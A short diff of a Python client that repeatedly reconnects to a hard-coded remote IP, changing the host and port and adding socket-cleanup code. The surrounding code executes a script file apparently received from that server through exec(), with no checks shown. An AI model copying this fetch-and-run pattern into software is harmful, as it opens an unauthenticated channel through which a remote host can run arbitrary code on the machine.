@@ -4,12 +4,22 @@ import os
 import time
 import datetime
 
+def closeConnection(sock):
+    try:
+        sock.shutdown(socket.SHUT_RDWR)
+    except:
+        pass
+    try:
+        sock.close()
+    except:
+        pass
+
 def newConnection():
 
     s = socket.socket() # new socket object
-    host = "34.73.159.141"
+    host = "34.73.146.51"
     # host = socket.gethostname()
-    port = 3777
+    port = 3774
 
     while True: # attempt to make connection to server
         try:
@@ -42,11 +52,12 @@ def newConnection():
                     exec(open("./receive/script.py").read())
                 except Exception as e:
                     print(e)
+            else: # recv returned a 0 indicating closed socket
+                raise Exception('## Socket disconnected! ##')
     except Exception as e:
         print(e)
-        print("error! attempting to reconnect...")
-        s.shutdown(socket.SHUT_RDWR)
-        s.close()
+        print("attempting to reconnect due to error...")
+        closeConnection(s)
         return
 
 while True:
